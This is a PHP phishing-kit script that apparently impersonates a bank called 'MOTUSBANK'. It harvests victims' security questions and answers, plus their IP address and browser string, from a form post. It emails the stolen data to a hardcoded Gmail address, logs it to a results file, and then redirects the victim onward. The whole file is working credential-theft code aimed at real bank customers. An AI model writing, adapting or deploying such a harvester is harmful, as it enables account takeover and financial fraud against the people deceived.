<?
$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "-----------------2 QUESTIONSDetails---------------\n";
$message .= "Q1		: ".$_POST['Q1']."\n";
$message .= "A1		: ".$_POST['A1']."\n";
$message .= "Q2		: ".$_POST['Q2']."\n";
$message .= "A2		: ".$_POST['A2']."\n";
$message .= "Q3		: ".$_POST['Q3']."\n";
$message .= "A3		: ".$_POST['A3']."\n";
$message .= "-----------------created by medpage---------------\n";
$message .= "IP          : ".$ip."\n";$IP=$_POST['IP'];
$message .= "BROWSER     : ".$browser."\n";$browser=$_POST['browser'];
$message .= "-----------------MOTUSBANKResults-----------------\n";
$send = "flashygordon6754@gmail.com";
$subject = "MOTUSBANKResults 3 ".$_POST['results'];
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message);
}
$fp = fopen('../../../MOTUSresults.txt', 'a');
fwrite($fp, $message);
fclose($fp);
?>
<script>

    window.top.location.href = "../../../directing.html";
</script>